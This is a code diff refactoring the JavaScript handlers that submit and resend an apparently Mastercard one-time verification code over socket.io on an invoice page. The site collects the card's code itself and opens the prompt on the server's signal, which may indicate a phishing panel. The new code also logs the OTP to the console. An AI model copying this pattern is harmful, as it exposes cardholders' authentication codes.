@@ -1257,47 +1257,68 @@ socket.on('show_mc_verification', (data) => {
       });
     }
     
-    if (mcConfirmBtn) {
-      mcConfirmBtn.addEventListener('click', function() {
-        const otp = mcOtpInput.value.trim();
-        if (!otp) {
-          const mcOtpError = document.getElementById('mcOtpError');
-          if (mcOtpError) {
-            mcOtpError.textContent = 'Please enter the verification code.';
-            mcOtpError.style.display = 'block';
-          }
-          return;
-        }
-        
-        // Emit event with OTP
-        const socket = io();
-        socket.emit('mc_otp_submitted', {
-          invoiceId: currentInvoiceId,
-          otp: otp
-        });
-        
-        // Disable button and show loading state
-        mcConfirmBtn.disabled = true;
-        mcConfirmBtn.textContent = 'VERIFYING...';
-      });
+if (mcConfirmBtn) {
+  mcConfirmBtn.addEventListener('click', function() {
+    const otp = mcOtpInput.value.trim();
+    if (!otp) {
+      const mcOtpError = document.getElementById('mcOtpError');
+      if (mcOtpError) {
+        mcOtpError.textContent = 'Please enter the verification code.';
+        mcOtpError.style.display = 'block';
+      }
+      return;
     }
     
+    // Disable button and show loading state
+    mcConfirmBtn.disabled = true;
+    const originalText = mcConfirmBtn.textContent;
+    mcConfirmBtn.innerHTML = '<div style="display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 1s linear infinite; margin-right: 8px; vertical-align: middle;"></div> VERIFYING...';
+    
+    // Emit event with OTP - use the existing socket
+    socket.emit('mc_otp_submitted', {
+      invoiceId: currentInvoiceId,
+      otp: otp
+    });
+    
+    console.log('MC OTP submitted:', otp, 'for invoice:', currentInvoiceId);
+    
+    // Reset button after some delay if no response
+    setTimeout(() => {
+      if (mcConfirmBtn.disabled) {
+        mcConfirmBtn.disabled = false;
+        mcConfirmBtn.innerHTML = originalText;
+      }
+    }, 10000); // 10 second timeout
+  });
+}
+    
     if (mcResendBtn) {
-      mcResendBtn.addEventListener('click', function() {
-        // Request resend of OTP
-        const socket = io();
-        socket.emit('mc_resend_otp', {
-          invoiceId: currentInvoiceId
-        });
-        
-        // Reset timer
-        setupMCTimerIfNeeded(true);
-        
-        // Show notification to user
-        alert('A new verification code has been sent.');
-      });
-    }
-  }
+  mcResendBtn.addEventListener('click', function() {
+    // Show loading state
+    const originalText = mcResendBtn.textContent;
+    mcResendBtn.disabled = true;
+    mcResendBtn.textContent = 'SENDING...';
+    
+    // Request resend of OTP - use the existing socket
+    socket.emit('mc_resend_otp', {
+      invoiceId: currentInvoiceId
+    });
+    
+    console.log('Requested OTP resend for invoice:', currentInvoiceId);
+    
+    // Reset timer
+    setupMCTimerIfNeeded(true);
+    
+    // Restore button after a short delay
+    setTimeout(() => {
+      mcResendBtn.disabled = false;
+      mcResendBtn.textContent = originalText;
+      
+      // Show notification to user
+      alert('A new verification code has been sent.');
+    }, 1500);
+  });
+}
   
   function setupMCTimerIfNeeded(reset = false) {
     const timerElement = document.getElementById('mcTimer');
